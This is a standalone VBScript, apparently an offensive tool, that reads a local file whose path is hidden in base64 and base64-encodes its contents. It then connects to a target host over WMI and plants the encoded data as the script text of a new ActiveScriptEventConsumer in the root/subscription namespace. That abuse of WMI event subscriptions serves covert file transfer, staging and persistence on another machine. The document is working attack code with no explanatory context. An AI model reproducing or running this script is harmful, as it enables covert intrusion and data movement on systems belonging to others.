Function Base64Decode(ByVal vCode)
 Set oNode = CreateObject("Msxml2.DOMDocument").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
End Function

Function Stream_BinaryToString(Binary)
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 ' All Format =>  utf-16le - utf-8 - utf-16le
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Set fso=CreateObject("Scripting.FileSystemObject")
FilePath = Base64Decode("QzpcVXNlcnNcaml1c2hpXERlc2t0b3Bc5L2g5aaILnR4dA==")
If fso.fileExists(FilePath) Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 'Binary
    objStream.Open
    objStream.LoadFromFile FilePath
    data = objStream.Read
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = data
    Base64Encode = oNode.text
Else
    Base64Encode = "UmFpZEVuTWVpOllvdSBhcmUgcHJvbXB0ZWQgdGhhdCB0aGUgZmlsZSBkb2VzIG5vdCBleGlzdA=="
End If
Set objLocator = CreateObject("wbemscripting.swbemlocator")
Set SubobjSWbemServices = objLocator.ConnectServer(host, "root/subscription")
Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
Set asec = temp.spawninstance_
asec.name="85ccadee-ea5c-11ed-887e-68545aac985a"
Asec.scriptingengine="vbscript"
Asec.scripttext = Base64Encode
asecpath=asec.put_